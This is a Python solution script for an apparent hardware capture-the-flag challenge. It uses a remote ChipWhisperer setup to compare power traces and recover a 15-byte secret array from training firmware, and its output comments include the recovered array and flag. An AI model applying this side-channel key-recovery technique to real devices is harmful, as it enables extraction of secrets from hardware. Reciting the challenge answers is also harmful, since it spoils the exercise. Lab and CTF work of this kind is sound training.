from pathlib import Path
import sys

# Adding parent directory to the path to access utils
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from utils.remote_cw import remote_cw, RemoteConfig
from utils.helper_cv import setup_cw, cap_pass_trace, plot_traces, PLATFORM, interact
import numpy as np
import matplotlib.pyplot as plt
from rpyc.utils.classic import obtain

cfg = RemoteConfig(
    host="remotechipwhisperer.example", # replace with hostname of the remote pi or its IP address
    user="pi",
    key_filename="path/to/your/priv_key", # replace with your private key path
    port=18812,                  # must match the rpyc_classic on the Pi
    connect_host="127.0.0.1",    # local end (your machine)
    remote_host="127.0.0.1",     # remote rpyc_classic bind address
)


def main():
    with remote_cw(cfg) as cw:
        # This runs on the REMOTE machine inside the venv!
        scope, target, prog = setup_cw(cw,cw.scope())

        # Setting up the scope for capturing
        scope.adc.samples = 1000
        BAUD = target.baud
        CLOCK = scope.io.clkout
        NEWCLOCK = 7.5e6
        scope.io.clkout = NEWCLOCK
        NEWCLOCK = scope.io.clkout
        target.baud = BAUD * NEWCLOCK / CLOCK
        scope.adc.clk_freq = 7500000.0
        print(f"[+] Changed baud rate from {BAUD} to {target.baud}")
        print(f"[+] Changed clkout from {CLOCK} to {NEWCLOCK}")

        # Setup the target for simpleserial
        cw.put_file("sortersSong-{}.hex".format(PLATFORM), "sorterSong-{}.hex".format(PLATFORM))
        cw.program_target(scope, prog, "/home/pi/remote_files/sorterSong-{}.hex".format(PLATFORM))
        print("[+] Programmed target with sorterSong-{}.hex".format(PLATFORM))

        # Attack loop for SorterSong1
        secret_array = []
        # Get reference diff for no sorting
        interact(scope, target, command="p", pass_guess=bytes([1, 0, 0, 0]), bytes_to_read=2)
        reference_trace = obtain(cap_pass_trace(scope, target, b'', command="c", reset=False))
        interact(scope, target, command="p", pass_guess=bytes([1, 1, 0, 0]), bytes_to_read=2)
        reference_trace_2 = obtain(cap_pass_trace(scope, target, b'', command="c", reset=False))
        diff_ref = np.sum(np.abs(reference_trace - reference_trace_2))
        #print(f"Diff for 0 and 1: {diff_ref}")

        # First iteration for byte 0
        for i in range(2, 30):
            interact(scope, target, command="p", pass_guess=bytes([1, i, 0, 0]), bytes_to_read=2)
            trace = obtain(cap_pass_trace(scope, target, b'', command="c", reset=False))
            dft_trace = np.fft.rfft(trace)
            diff = np.abs(trace - reference_trace)
            #print(f"Diff for {i} for position 1: {np.sum(diff)}")
            #plot_traces([reference_trace, trace], filename=f"traces/sort_{i}.png")
            if np.sum(diff) > diff_ref+100:
                print(f"[+] Found byte {i-1} for position 1")
                secret_array.append(i-1)
                break

        # Reset array
        interact(scope, target, command="x", pass_guess=b'')
        
        for byte_pos in range(len(secret_array), 15):
            interact(scope, target, command="p", pass_guess=bytes([1, secret_array[-1]-1, 0, byte_pos]), bytes_to_read=2)
            reference_trace = obtain(cap_pass_trace(scope, target, b'', command="c", reset=False))
            interact(scope, target, command="p", pass_guess=bytes([1, secret_array[-1], 0, byte_pos]), bytes_to_read=2)
            reference_trace_2 = obtain(cap_pass_trace(scope, target, b'', command="c", reset=False))
            diff_ref = np.sum(np.abs(reference_trace - reference_trace_2))
            #print(f"Diff for {secret_array[-1]-1} and {secret_array[-1]}: {diff_ref}")
            for i in range(secret_array[-1]+1, 255):
                interact(scope, target, command="p", pass_guess=bytes([1, i, 0, byte_pos]), bytes_to_read=2)
                trace = obtain(cap_pass_trace(scope, target, b'', command="c", reset=False))
                diff = np.abs(trace - reference_trace)
                #print(f"Diff for {i} at position {byte_pos+1}: {np.sum(diff)}")
                if np.sum(diff) > diff_ref+100:
                    print(f"[+] Found byte {i-1} for position {byte_pos+1}")
                    secret_array.append(i-1)
                    break

        print("[+] Secret array found: ", secret_array)   
        flag = interact(scope, target, command="a", pass_guess=bytes(secret_array), bytes_to_read=20)  
        print("[+] Flag: ", flag)       
if __name__ == "__main__":
    main()

# [+] Programmed target with sorterSong-CWNANO.hex
# [+] Found byte 7 for position 1
# [+] Found byte 12 for position 2
# [+] Found byte 43 for position 3
# [+] Found byte 52 for position 4
# [+] Found byte 57 for position 5
# [+] Found byte 66 for position 6
# [+] Found byte 80 for position 7
# [+] Found byte 104 for position 8
# [+] Found byte 113 for position 9
# [+] Found byte 124 for position 10
# [+] Found byte 136 for position 11
# [+] Found byte 147 for position 12
# [+] Found byte 172 for position 13
# [+] Found byte 177 for position 14
# [+] Found byte 219 for position 15
# [+] Secret array found:  [7, 12, 43, 52, 57, 66, 80, 104, 113, 124, 136, 147, 172, 177, 219]
# [+] Flag:  bytearray(b'ss1{y0u_g0t_it_br0!}')